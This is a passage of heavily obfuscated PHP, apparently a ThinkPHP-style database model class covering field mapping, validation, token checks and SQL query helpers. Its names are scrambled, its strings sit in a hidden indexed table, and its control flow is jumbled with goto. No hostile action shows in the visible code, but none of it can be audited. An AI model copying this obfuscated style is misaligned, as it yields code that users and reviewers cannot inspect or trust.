$E‹§–ŠÒºÓ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($fæª¶¼²ğ) { if (is_callable($fæª¶¼²ğ)) { return call_user_func($fæª¶¼²ğ, $bƒ×İÄ„‰¬); } switch (strtolower($fæª¶¼²ğ)) { case $E‹§–ŠÒºÓ[278]: return json_encode($bƒ×İÄ„‰¬); case $E‹§–ŠÒºÓ[279]: return xml_encode($bƒ×İÄ„‰¬); } } return $bƒ×İÄ„‰¬; } public function parseFieldsMap($d¿‰¦ÒñÄé, $F’íŸ‡ˆè = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Dß–ÖĞØŞ© => $b…œÃ¯Ä) { if ($F’íŸ‡ˆè == 1) { if (isset($d¿‰¦ÒñÄé[$b…œÃ¯Ä])) { $d¿‰¦ÒñÄé[$Dß–ÖĞØŞ©] = $d¿‰¦ÒñÄé[$b…œÃ¯Ä]; unset($d¿‰¦ÒñÄé[$b…œÃ¯Ä]); } } else { if (isset($d¿‰¦ÒñÄé[$Dß–ÖĞØŞ©])) { $d¿‰¦ÒñÄé[$b…œÃ¯Ä] = $d¿‰¦ÒñÄé[$Dß–ÖĞØŞ©]; unset($d¿‰¦ÒñÄé[$Dß–ÖĞØŞ©]); } } } } return $d¿‰¦ÒñÄé; } public function setField($aãØäÁ«Ò, $D®ËÕè×¼ = '') { if (is_array($aãØäÁ«Ò)) { $E×²¸¯¥» = $aãØäÁ«Ò; } else { $E×²¸¯¥»[$aãØäÁ«Ò] = $D®ËÕè×¼; } return $this->save($E×²¸¯¥»); } public function setAdd($Eì¹¢·âÃÓ, $dóŒÒ¬ó­ = 1) { $CªÓÀ¶Àë =& $_SERVER[Ö¹ñÒÁ²÷]; $D§¦ÃÜ½Ä¢ = $Eì¹¢·âÃÓ . $CªÓÀ¶Àë[280] . $dóŒÒ¬ó­; if ($dóŒÒ¬ó­ < 0) { $D§¦ÃÜ½Ä¢ = $Eì¹¢·âÃÓ . $dóŒÒ¬ó­; } return $this->setField($Eì¹¢·âÃÓ, array($CªÓÀ¶Àë[281], $D§¦ÃÜ½Ä¢)); } public function getField($D•Ã…™íÍ’, $döŞ‚™«›° = null) { $b¡÷•±ˆ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÎù‰´óè[$b¡÷•±ˆ‚[257]] = $D•Ã…™íÍ’; $bÎù‰´óè = $this->_parseOptions($bÎù‰´óè); $D•Ã…™íÍ’ = trim($D•Ã…™íÍ’); if (strpos($D•Ã…™íÍ’, $b¡÷•±ˆ‚[47])) { if (!isset($bÎù‰´óè[$b¡÷•±ˆ‚[276]])) { $bÎù‰´óè[$b¡÷•±ˆ‚[276]] = is_numeric($döŞ‚™«›°) ? $döŞ‚™«›° : $b¡÷•±ˆ‚[33]; } $bŠ˜¾÷Ç©‹ = $this->db->select($bÎù‰´óè); if (!empty($bŠ˜¾÷Ç©‹)) { goto añš­ƒƒè¹; añš­ƒƒè¹: $a¥òÂƒ‹»É = explode($b¡÷•±ˆ‚[47], $D•Ã…™íÍ’); $D•Ã…™íÍ’ = array_keys($bŠ˜¾÷Ç©‹[0]); $CŒ§Ôã£ƒ = array_shift($D•Ã…™íÍ’); goto B—¶±â¡ôŠ; A„Œ°ñÓˆ: foreach ($bŠ˜¾÷Ç©‹ as $c¸»è®œˆ¢) { $e‰…Ï–Ï‡Õ = $c¸»è®œˆ¢[$CŒ§Ôã£ƒ]; if (2 == $F¦Ë„õØçñ) { $A—¨Ë·ª™´[$e‰…Ï–Ï‡Õ] = $c¸»è®œˆ¢[$dñÇµÕ–šÃ]; } else { $A—¨Ë·ª™´[$e‰…Ï–Ï‡Õ] = is_string($döŞ‚™«›°) ? implode($döŞ‚™«›°, $c¸»è®œˆ¢) : $c¸»è®œˆ¢; } } return $A—¨Ë·ª™´; goto b·ë¢“…Òˆ; B—¶±â¡ôŠ: $dñÇµÕ–šÃ = array_shift($D•Ã…™íÍ’); $A—¨Ë·ª™´ = array(); $F¦Ë„õØçñ = count($a¥òÂƒ‹»É); goto A„Œ°ñÓˆ; b·ë¢“…Òˆ: } } else { if (!0 !== $döŞ‚™«›°) { $bÎù‰´óè[$b¡÷•±ˆ‚[276]] = is_numeric($döŞ‚™«›°) ? $döŞ‚™«›° : 1; } if ($döŞ‚™«›° === $b¡÷•±ˆ‚[239]) { unset($bÎù‰´óè[$b¡÷•±ˆ‚[276]]); } $c¸»è®œˆ¢ = $this->db->select($bÎù‰´óè); if (!empty($c¸»è®œˆ¢)) { if ($döŞ‚™«›° === $b¡÷•±ˆ‚[239]) { return reset($c¸»è®œˆ¢[0]); } if (!0 !== $döŞ‚™«›° && 1 == $bÎù‰´óè[$b¡÷•±ˆ‚[276]]) { return reset($c¸»è®œˆ¢[0]); } foreach ($c¸»è®œˆ¢ as $AÓ…Ëî¸ ¼) { $d…îÉ•¹áù[] = $AÓ…Ëî¸ ¼[$D•Ã…™íÍ’]; } return $d…îÉ•¹áù; } } return null; } public function create($Bò„Ğ™÷ì = '', $Díˆ¶ÆÕ§ = '') { goto céİÁÈ£¬•; aö·ë¬‡íÔ: return $Bò„Ğ™÷ì; goto DèÈ¶Ôƒ“ô; cä©Û‡¿ƒ: $Bò„Ğ™÷ì = $this->parseFieldsMap($Bò„Ğ™÷ì, 0); $Díˆ¶ÆÕ§ = $Díˆ¶ÆÕ§ ? $Díˆ¶ÆÕ§ : (!empty($Bò„Ğ™÷ì[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F›Œ ƒø‘â[257]])) { $BØÛ†ÖœÒš = $this->options[$F›Œ ƒø‘â[257]]; unset($this->options[$F›Œ ƒø‘â[257]]); } elseif ($Díˆ¶ÆÕ§ == THINK_MODEL_INSERT && isset($this->insertFields)) { $BØÛ†ÖœÒš = $this->insertFields; } elseif ($Díˆ¶ÆÕ§ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $BØÛ†ÖœÒš = $this->updateFields; } goto AÇ”†ÊĞˆ; d±É´¸„ÚÉ: if ($this->autoCheckFields) { $BØÛ†ÖœÒš = $this->getDbFields(); foreach ($Bò„Ğ™÷ì as $B‡‹ñÔ†à => $eµ¦ï¢ñÓ) { if (!in_array($B‡‹ñÔ†à, $BØÛ†ÖœÒš)) { unset($Bò„Ğ™÷ì[$B‡‹ñÔ†à]); } elseif (MAGIC_QUOTES_GPC && is_string($eµ¦ï¢ñÓ)) { $Bò„Ğ™÷ì[$B‡‹ñÔ†à] = stripslashes($eµ¦ï¢ñÓ); } } } $this->autoOperation($Bò„Ğ™÷ì, $Díˆ¶ÆÕ§); $this->data = $Bò„Ğ™÷ì; goto aö·ë¬‡íÔ; AÇ”†ÊĞˆ: if (isset($BØÛ†ÖœÒš)) { if (is_string($BØÛ†ÖœÒš)) { $BØÛ†ÖœÒš = explode($F›Œ ƒø‘â[47], $BØÛ†ÖœÒš); } if (think_config($F›Œ ƒø‘â[282])) { $BØÛ†ÖœÒš[] = think_config($F›Œ ƒø‘â[283]); } foreach ($Bò„Ğ™÷ì as $B‡‹ñÔ†à => $eµ¦ï¢ñÓ) { if (!in_array($B‡‹ñÔ†à, $BØÛ†ÖœÒš)) { unset($Bò„Ğ™÷ì[$B‡‹ñÔ†à]); } } } if (!$this->autoValidation($Bò„Ğ™÷ì, $Díˆ¶ÆÕ§)) { return !1; } if (!$this->autoCheckToken($Bò„Ğ™÷ì)) { $this->error = think_lang($F›Œ ƒø‘â[284]); return !1; } goto d±É´¸„ÚÉ; céİÁÈ£¬•: $F›Œ ƒø‘â =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($Bò„Ğ™÷ì)) { $Bò„Ğ™÷ì = $_POST; } elseif (is_object($Bò„Ğ™÷ì)) { $Bò„Ğ™÷ì = get_object_vars($Bò„Ğ™÷ì); } if (empty($Bò„Ğ™÷ì) || !is_array($Bò„Ğ™÷ì)) { $this->error = think_lang($F›Œ ƒø‘â[255]); return !1; } goto cä©Û‡¿ƒ; DèÈ¶Ôƒ“ô: } public function autoCheckToken($D¶­öÎÃœğ) { $eç´ñ“òó =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($this->options[$eç´ñ“òó[285]]) && !$this->options[$eç´ñ“òó[285]]) { return !0; } if (think_config($eç´ñ“òó[282])) { $dŒºÍŠÛÎˆ = think_config($eç´ñ“òó[283]); if (!isset($D¶­öÎÃœğ[$dŒºÍŠÛÎˆ]) || Session::get($dŒºÍŠÛÎˆ)) { return !1; } list($cÂ§ôïâò¥, $DØà°¿ÈĞ´) = explode($eç´ñ“òó[70], $D¶­öÎÃœğ[$dŒºÍŠÛÎˆ]); if ($DØà°¿ÈĞ´ && Session::get($dŒºÍŠÛÎˆ . $eç´ñ“òó[91] . $cÂ§ôïâò¥) === $DØà°¿ÈĞ´) { Session::remove($dŒºÍŠÛÎˆ . $eç´ñ“òó[91] . $cÂ§ôïâò¥); return !0; } if (think_config($eç´ñ“òó[286])) { Session::remove($dŒºÍŠÛÎˆ . $eç´ñ“òó[91] . $cÂ§ôïâò¥); } return !1; } return !0; } public function regex($FªØ÷Ú‹Ã², $aœ†ºôØÆä) { $bÉ·ŞÈ¹› =& $_SERVER[Ö¹ñÒÁ²÷]; $d•ê„êâ‘ = array($bÉ·ŞÈ¹›[287] => $bÉ·ŞÈ¹›[288], $bÉ·ŞÈ¹›[289] => $bÉ·ŞÈ¹›[290], $bÉ·ŞÈ¹›[291] => $bÉ·ŞÈ¹›[292], $bÉ·ŞÈ¹›[293] => $bÉ·ŞÈ¹›[294], $bÉ·ŞÈ¹›[295] => $bÉ·ŞÈ¹›[296], $bÉ·ŞÈ¹›[297] => $bÉ·ŞÈ¹›[298], $bÉ·ŞÈ¹›[299] => $bÉ·ŞÈ¹›[300], $bÉ·ŞÈ¹›[274] => $bÉ·ŞÈ¹›[301], $bÉ·ŞÈ¹›[302] => $bÉ·ŞÈ¹›[303]); if (isset($d•ê„êâ‘[strtolower($aœ†ºôØÆä)])) { $aœ†ºôØÆä = $d•ê„êâ‘[strtolower($aœ†ºôØÆä)]; } return preg_match($aœ†ºôØÆä, $FªØ÷Ú‹Ã²) === 1; } private function autoOperation(&$fµ¥òê„ó÷, $b®øÌ¹°˜¯) { $bÂ…°ßé± =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($this->options[$bÂ…°ßé±[304]])) { $f¢‡ ¸• = $this->options[$bÂ…°ßé±[304]]; unset($this->options[$bÂ…°ßé±[304]]); } elseif (!empty($this->_auto)) { $f¢‡ ¸• = $this->_auto; } if (isset($f¢‡ ¸•)) { foreach ($f¢‡ ¸• as $aÔŠ‹‰¶¨Ò) { if (empty($aÔŠ‹‰¶¨Ò[2])) { $aÔŠ‹‰¶¨Ò[2] = THINK_MODEL_INSERT; } if ($b®øÌ¹°˜¯ == $aÔŠ‹‰¶¨Ò[2] || $aÔŠ‹‰¶¨Ò[2] == THINK_MODEL_BOTH) { switch (trim($aÔŠ‹‰¶¨Ò[3])) { case $bÂ…°ßé±[305]: case $bÂ…°ßé±[306]: $DØ¾¼øÍ’Å = isset($aÔŠ‹‰¶¨Ò[4]) ? (array) $aÔŠ‹‰¶¨Ò[4] : array(); if (isset($fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]])) { array_unshift($DØ¾¼øÍ’Å, $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]]); } if ($bÂ…°ßé±[305] == $aÔŠ‹‰¶¨Ò[3]) { $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]] = call_user_func_array($aÔŠ‹‰¶¨Ò[1], $DØ¾¼øÍ’Å); } else { $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]] = call_user_func_array(array(&$this, $aÔŠ‹‰¶¨Ò[1]), $DØ¾¼øÍ’Å); } break; case $bÂ…°ßé±[257]: $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]] = $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[1]]; break; case $bÂ…°ßé±[307]: if ($bÂ…°ßé±[33] === $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]]) { unset($fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]]); } break; case $bÂ…°ßé±[308]: default: $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]] = $aÔŠ‹‰¶¨Ò[1]; } if (!1 === $fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]]) { unset($fµ¥òê„ó÷[$aÔŠ‹‰¶¨Ò[0]]); } } } } return $fµ¥òê„ó÷; } protected function autoValidation($eÔØƒî·èº, $BĞÚ¶¹‘”Š) { $dñŒ‹…ìì÷ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($this->options[$dñŒ‹…ìì÷[309]])) { $A†Ó–Ü¹«’ = $this->options[$dñŒ‹…ìì÷[309]]; unset($this->options[$dñŒ‹…ìì÷[309]]); } elseif (!empty($this->_validate)) { $A†Ó–Ü¹«’ = $this->_validate; } if (isset($A†Ó–Ü¹«’)) { if ($this->patchValidate) { $this->error = array(); } foreach ($A†Ó–Ü¹«’ as $D½øÄ¦ïç½ => $có—ƒÙÈİ°) { if (empty($có—ƒÙÈİ°[5]) || $có—ƒÙÈİ°[5] == THINK_MODEL_BOTH || $có—ƒÙÈİ°[5] == $BĞÚ¶¹‘”Š) { if (0 == strpos($có—ƒÙÈİ°[2], $dñŒ‹…ìì÷[310]) && strpos($có—ƒÙÈİ°[2], $dñŒ‹…ìì÷[311])) { $có—ƒÙÈİ°[2] = think_lang(substr($có—ƒÙÈİ°[2], 2, -1)); } $có—ƒÙÈİ°[3] = isset($có—ƒÙÈİ°[3]) ? $có—ƒÙÈİ°[3] : THINK_EXISTS_VALIDATE; $có—ƒÙÈİ°[4] = isset($có—ƒÙÈİ°[4]) ? $có—ƒÙÈİ°[4] : $dñŒ‹…ìì÷[312]; switch ($có—ƒÙÈİ°[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($eÔØƒî·èº, $có—ƒÙÈİ°)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($dñŒ‹…ìì÷[33] != trim($eÔØƒî·èº[$có—ƒÙÈİ°[0]])) { if (!1 === $this->_validationField($eÔØƒî·èº, $có—ƒÙÈİ°)) { return !1; } } break; default: if (isset($eÔØƒî·èº[$có—ƒÙÈİ°[0]])) { if (!1 === $this->_validationField($eÔØƒî·èº, $có—ƒÙÈİ°)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dÜ¼±æ‡„ , $CØÖ‰æ‚Ä) { if (!1 === $this->_validationFieldItem($dÜ¼±æ‡„ , $CØÖ‰æ‚Ä)) { if ($this->patchValidate) { $this->error[$CØÖ‰æ‚Ä[0]] = $CØÖ‰æ‚Ä[2]; } else { $this->error = $CØÖ‰æ‚Ä[2]; return !1; } } return; } protected function _validationFieldItem($c×ßÄÖÓ, $DëáŞäÕ²) { $B‚÷Ê–Æ‘ =& $_SERVER[Ö¹ñÒÁ²÷]; switch (strtolower(trim($DëáŞäÕ²[4]))) { case $B‚÷Ê–Æ‘[305]: case $B‚÷Ê–Æ‘[306]: $DÏ¬êöÒ¨è = isset($DëáŞäÕ²[6]) ? (array) $DëáŞäÕ²[6] : array(); if (is_string($DëáŞäÕ²[0]) && strpos($DëáŞäÕ²[0], $B‚÷Ê–Æ‘[47])) { $DëáŞäÕ²[0] = explode($B‚÷Ê–Æ‘[47], $DëáŞäÕ²[0]); } if (is_array($DëáŞäÕ²[0])) { foreach ($DëáŞäÕ²[0] as $DÕÙĞë†ƒæ) { $dÙŞ‚ÕöÕÌ[$DÕÙĞë†ƒæ] = $c×ßÄÖÓ[$DÕÙĞë†ƒæ]; } array_unshift($DÏ¬êöÒ¨è, $dÙŞ‚ÕöÕÌ); } else { array_unshift($DÏ¬êöÒ¨è, $c×ßÄÖÓ[$DëáŞäÕ²[0]]); } if ($B‚÷Ê–Æ‘[305] == $DëáŞäÕ²[4]) { return call_user_func_array($DëáŞäÕ²[1], $DÏ¬êöÒ¨è); } else { return call_user_func_array(array(&$this, $DëáŞäÕ²[1]), $DÏ¬êöÒ¨è); } case $B‚÷Ê–Æ‘[313]: return $c×ßÄÖÓ[$DëáŞäÕ²[0]] == $c×ßÄÖÓ[$DëáŞäÕ²[1]]; case $B‚÷Ê–Æ‘[314]: if (is_string($DëáŞäÕ²[0]) && strpos($DëáŞäÕ²[0], $B‚÷Ê–Æ‘[47])) { $DëáŞäÕ²[0] = explode($B‚÷Ê–Æ‘[47], $DëáŞäÕ²[0]); } $c¬’ÏìÒ = array(); if (is_array($DëáŞäÕ²[0])) { foreach ($DëáŞäÕ²[0] as $DÕÙĞë†ƒæ) { $c¬’ÏìÒ[$DÕÙĞë†ƒæ] = $c×ßÄÖÓ[$DÕÙĞë†ƒæ]; } } else { $c¬’ÏìÒ[$DëáŞäÕ²[0]] = $c×ßÄÖÓ[$DëáŞäÕ²[0]]; } if (!empty($c×ßÄÖÓ[$this->getPk()])) { $c¬’ÏìÒ[$this->getPk()] = array($B‚÷Ê–Æ‘[315], $c×ßÄÖÓ[$this->getPk()]); } if ($this->where($c¬’ÏìÒ)->find()) { return !1; } return !0; default: return $this->check($c×ßÄÖÓ[$DëáŞäÕ²[0]], $DëáŞäÕ²[1], $DëáŞäÕ²[4]); } } public function check($cáñâˆÙ®, $BÔ¿õŸÛ¢, $CùÀõÂ—Ôù = "\x72\x65\147\x65\x78") { $c‰é±œ†ì =& $_SERVER[Ö¹ñÒÁ²÷]; $CùÀõÂ—Ôù = strtolower(trim($CùÀõÂ—Ôù)); switch ($CùÀõÂ—Ôù) { case $c‰é±œ†ì[7]: case $c‰é±œ†ì[316]: $bÛÌğ¯£Û = is_array($BÔ¿õŸÛ¢) ? $BÔ¿õŸÛ¢ : explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢); return $CùÀõÂ—Ôù == $c‰é±œ†ì[7] ? in_array($cáñâˆÙ®, $bÛÌğ¯£Û) : !in_array($cáñâˆÙ®, $bÛÌğ¯£Û); case $c‰é±œ†ì[317]: case $c‰é±œ†ì[318]: if (is_array($BÔ¿õŸÛ¢)) { $AÒÏŒ …è± = $BÔ¿õŸÛ¢[0]; $CÍ„¼Çªå = $BÔ¿õŸÛ¢[1]; } else { list($AÒÏŒ …è±, $CÍ„¼Çªå) = explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢); } return $CùÀõÂ—Ôù == $c‰é±œ†ì[317] ? $cáñâˆÙ® >= $AÒÏŒ …è± && $cáñâˆÙ® <= $CÍ„¼Çªå : $cáñâˆÙ® < $AÒÏŒ …è± || $cáñâˆÙ® > $CÍ„¼Çªå; case $c‰é±œ†ì[319]: case $c‰é±œ†ì[320]: return $CùÀõÂ—Ôù == $c‰é±œ†ì[319] ? $cáñâˆÙ® == $BÔ¿õŸÛ¢ : $cáñâˆÙ® != $BÔ¿õŸÛ¢; case $c‰é±œ†ì[321]: $B¸‘‰‡™å = mb_strlen($cáñâˆÙ®, $c‰é±œ†ì[322]); if (strpos($BÔ¿õŸÛ¢, $c‰é±œ†ì[47])) { list($AÒÏŒ …è±, $CÍ„¼Çªå) = explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢); return $B¸‘‰‡™å >= $AÒÏŒ …è± && $B¸‘‰‡™å <= $CÍ„¼Çªå; } else { return $B¸‘‰‡™å == $BÔ¿õŸÛ¢; } case $c‰é±œ†ì[323]: list($Aæ¼˜¨Ä¾, $Aáõãï©–) = explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢); if (!is_numeric($Aæ¼˜¨Ä¾)) { $Aæ¼˜¨Ä¾ = strtotime($Aæ¼˜¨Ä¾); } if (!is_numeric($Aáõãï©–)) { $Aáõãï©– = strtotime($Aáõãï©–); } return NOW_TIME >= $Aæ¼˜¨Ä¾ && NOW_TIME <= $Aáõãï©–; case $c‰é±œ†ì[324]: return in_array(get_client_ip(), explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢)); case $c‰é±œ†ì[325]: return !in_array(get_client_ip(), explode($c‰é±œ†ì[47], $BÔ¿õŸÛ¢)); case $c‰é±œ†ì[312]: default: return $this->regex($cáñâˆÙ®, $BÔ¿õŸÛ¢); } } public function query($AøŠ•ÏŒµ³, $Aèšã…Ğ¨ = false) { $b‰ÏŠâİÚ² =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_bool($Aèšã…Ğ¨) && !is_array($Aèšã…Ğ¨)) { $Aèšã…Ğ¨ = func_get_args(); array_shift($Aèšã…Ğ¨); } $AøŠ•ÏŒµ³ = str_replace(array($b‰ÏŠâİÚ²[213], $b‰ÏŠâİÚ²[326]), $b‰ÏŠâİÚ²[50], $AøŠ•ÏŒµ³); $AøŠ•ÏŒµ³ = $this->parseSql($AøŠ•ÏŒµ³, $Aèšã…Ğ¨); return $this->db->query($AøŠ•ÏŒµ³); } public function execute($eµÉ¡ÚŠóÓ, $få©òäÆ°Å = false) { if (!is_bool($få©òäÆ°Å) && !is_array($få©òäÆ°Å)) { $få©òäÆ°Å = func_get_args(); array_shift($få©òäÆ°Å); } $eµÉ¡ÚŠóÓ = $this->parseSql($eµÉ¡ÚŠóÓ, $få©òäÆ°Å); return $this->db->execute($eµÉ¡ÚŠóÓ); } protected function parseSql($b¸”õ¸ã…µ, $BæÑÔß‡Ÿµ) { $c¦æŒÏ„Í =& $_SERVER[Ö¹ñÒÁ²÷]; if (!0 === $BæÑÔß‡Ÿµ) { $a×ì‰°ƒ¬¨ = $this->_parseOptions(); $b¸”õ¸ã…µ = $this->db->parseSql($b¸”õ¸ã…µ, $a×ì‰°ƒ¬¨); } elseif (is_array($BæÑÔß‡Ÿµ)) { $BæÑÔß‡Ÿµ = array_map(array($this->db, $c¦æŒÏ„Í[327]), $BæÑÔß‡Ÿµ); $b¸”õ¸ã…µ = vsprintf($b¸”õ¸ã…µ, $BæÑÔß‡Ÿµ); } else { $b¸”õ¸ã…µ = strtr($b¸”õ¸ã…µ, array($c¦æŒÏ„Í[328] => $this->getTableName(), $c¦æŒÏ„Í[329] => think_config($c¦æŒÏ„Í[228]))); } $this->db->setModel($this->name); return $b¸”õ¸ã…µ; } public function db($eÛÚôòæê = '', $Fƒé¿…ôìˆ = '', $BÓƒƒò‰ = array()) { goto e×ñ½Íä»­; DÚæƒØåä¼: $e“˜œŞ‘°Ó[$eÛÚôòæê] = $Fƒé¿…ôìˆ; $this->db = $aà‰–¿»ˆ”[$eÛÚôòæê]; $this->_after_db(); goto AñŒä¬‰¿; e×ñ½Íä»­: $BŒĞÁ¬÷•° =& $_SERVER[Ö¹ñÒÁ²÷]; if ($BŒĞÁ¬÷•°[33] === $eÛÚôòæê && $this->db) { return $this->db; } static $e“˜œŞ‘°Ó = array(); goto b‘‘§“ö¢Ö; b‘‘§“ö¢Ö: static $aà‰–¿»ˆ” = array(); if (!isset($aà‰–¿»ˆ”[$eÛÚôòæê]) || isset($aà‰–¿»ˆ”[$eÛÚôòæê]) && $Fƒé¿…ôìˆ && $e“˜œŞ‘°Ó[$eÛÚôòæê] != $Fƒé¿…ôìˆ) { if (!empty($Fƒé¿…ôìˆ) && is_string($Fƒé¿…ôìˆ) && !1 === strpos($Fƒé¿…ôìˆ, $BŒĞÁ¬÷•°[8])) { $Fƒé¿…ôìˆ = think_config($Fƒé¿…ôìˆ); } $aà‰–¿»ˆ”[$eÛÚôòæê] = Db::getInstance($Fƒé¿…ôìˆ); } elseif (NULL === $Fƒé¿…ôìˆ) { $aà‰–¿»ˆ”[$eÛÚôòæê]->close(); unset($aà‰–¿»ˆ”[$eÛÚôòæê]); return; } if (!empty($BÓƒƒò‰)) { if (is_string($BÓƒƒò‰)) { parse_str($BÓƒƒò‰, $BÓƒƒò‰); } foreach ($BÓƒƒò‰ as $Bé¿ô²›æÊ => $a‚Ô‹â‘‰) { $this->setProperty($Bé¿ô²›æÊ, $a‚Ô‹â‘‰); } } goto DÚæƒØåä¼; AñŒä¬‰¿: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto EâÖÚÓÛâŞ; EâÖÚÓÛâŞ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $bƒì«Òà› = get_class($this); if ($bƒì«Òà› == $_SERVER[Ö¹ñÒÁ²÷][330]) { return $this->name; } $this->name = substr($bƒì«Òà›, 0, -5); } return $this->name; } public function getTableName() { $bÑ²¼ØÛ´ä =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($this->trueTableName)) { $cêà°—¦Äª = !empty($this->tablePrefix) ? $this->tablePrefix : $bÑ²¼ØÛ´ä[33]; if (!empty($this->tableName)) { $cêà°—¦Äª .= $this->tableName; } else { $cêà°—¦Äª .= think_parse_name($this->name); } $this->trueTableName = strtolower($cêà°—¦Äª); } return (!empty($this->dbName) ? $this->dbName . $bÑ²¼ØÛ´ä[91] : $bÑ²¼ØÛ´ä[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $FßëÁ£ˆÆÅ =& $_SERVER[Ö¹ñÒÁ²÷]; return isset($this->fields[$FßëÁ£ˆÆÅ[235]]) ? $this->fields[$FßëÁ£ˆÆÅ[235]] : $this->pk; } public function getDbFields() { $b®’ƒëÎ± =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($this->options[$b®’ƒëÎ±[263]])) { $bŒ³›İ“‚î = $this->db->getFields($this->options[$b®’ƒëÎ±[263]]); return $bŒ³›İ“‚î ? array_keys($bŒ³›İ“‚î) : !1; } if ($this->fields) { $bŒ³›İ“‚î = $this->fields; unset($bŒ³›İ“‚î[$b®’ƒëÎ±[234]], $bŒ³›İ“‚î[$b®’ƒëÎ±[235]], $bŒ³›İ“‚î[$b®’ƒëÎ±[236]], $bŒ³›İ“‚î[$b®’ƒëÎ±[233]]); return $bŒ³›İ“‚î; } return !1; } public function data($eğæ¥–µ—„ = '') { $dª™‚æ¤İ× =& $_SERVER[Ö¹ñÒÁ²÷]; if ($dª™‚æ¤İ×[33] === $eğæ¥–µ—„ && !empty($this->data)) { return $this->data; } if (is_object($eğæ¥–µ—„)) { $eğæ¥–µ—„ = get_object_vars($eğæ¥–µ—„); } elseif (is_string($eğæ¥–µ—„)) { parse_str($eğæ¥–µ—„, $eğæ¥–µ—„); } elseif (!is_array($eğæ¥–µ—„)) { think_exception(think_lang($dª™‚æ¤İ×[255])); } $this->data = $eğæ¥–µ—„; return $this; } public function join($Dø˜æŒÌ) { $AòËãöÁå› =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($Dø˜æŒÌ)) { $this->options[$AòËãöÁå›[266]] = $Dø˜æŒÌ; } elseif (!empty($Dø˜æŒÌ)) { $this->options[$AòËãöÁå›[266]][] = $Dø˜æŒÌ; } return $this; } public function union($DÉÎÎÄ‹Å, $Dª±ÄÅåšö = false) { goto bœ¿·Ü«ƒ; a•ŒÓœ½ëá: return $this; goto bÚ¶±øš÷•; eÀöéšëœß: if (is_object($DÉÎÎÄ‹Å)) { $DÉÎÎÄ‹Å = get_object_vars($DÉÎÎÄ‹Å); } if (is_string($DÉÎÎÄ‹Å)) { $d¹£™ñ¼©° = $DÉÎÎÄ‹Å; } elseif (is_array($DÉÎÎÄ‹Å)) { if (isset($DÉÎÎÄ‹Å[0])) { $this->options[$b‘õŒÏ¥ƒ¿[331]] = array_merge($this->options[$b‘õŒÏ¥ƒ¿[331]], $DÉÎÎÄ‹Å); return $this; } else { $d¹£™ñ¼©° = $DÉÎÎÄ‹Å; } } else { think_exception(think_lang($b‘õŒÏ¥ƒ¿[255])); } $this->options[$b‘õŒÏ¥ƒ¿[331]][] = $d¹£™ñ¼©°; goto a•ŒÓœ½ëá; bœ¿·Ü«ƒ: $b‘õŒÏ¥ƒ¿ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($DÉÎÎÄ‹Å)) { return $this; } if ($Dª±ÄÅåšö) { $this->options[$b‘õŒÏ¥ƒ¿[331]][$b‘õŒÏ¥ƒ¿[332]] = !0; } goto eÀöéšëœß; bÚ¶±øš÷•: } public function cache($F‰×ÔŸáïä = true, $EËœ¸–”ò­ = null, $fÏôë—Èåî = '') { $a•Î‡‘´…À =& $_SERVER[Ö¹ñÒÁ²÷]; if (!1 !== $F‰×ÔŸáïä) { $this->options[$a•Î‡‘´…À[333]] = array($a•Î‡‘´…À[89] => $F‰×ÔŸáïä, $a•Î‡‘´…À[323] => $EËœ¸–”ò­, $a•Î‡‘´…À[29] => $fÏôë—Èåî); } return $this; } public function field($D¶ìöÌÕ », $BÌŠƒÕõãğ = false) { $b±«–ì©»æ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!0 === $D¶ìöÌÕ ») { $f÷©Ô¸¯Â = $this->getDbFields(); $D¶ìöÌÕ » = $f÷©Ô¸¯Â ? $f÷©Ô¸¯Â : $b±«–ì©»æ[172]; } elseif ($BÌŠƒÕõãğ) { if (is_string($D¶ìöÌÕ »)) { $D¶ìöÌÕ » = explode($b±«–ì©»æ[47], $D¶ìöÌÕ »); } $f÷©Ô¸¯Â = $this->getDbFields(); $D¶ìöÌÕ » = $f÷©Ô¸¯Â ? array_diff($f÷©Ô¸¯Â, $D¶ìöÌÕ ») : $D¶ìöÌÕ »; } $this->options[$b±«–ì©»æ[257]] = $D¶ìöÌÕ »; return $this; } public function scope($cõ÷â´¼Íï = '', $dÑµŒ£Ö÷ = NULL) { 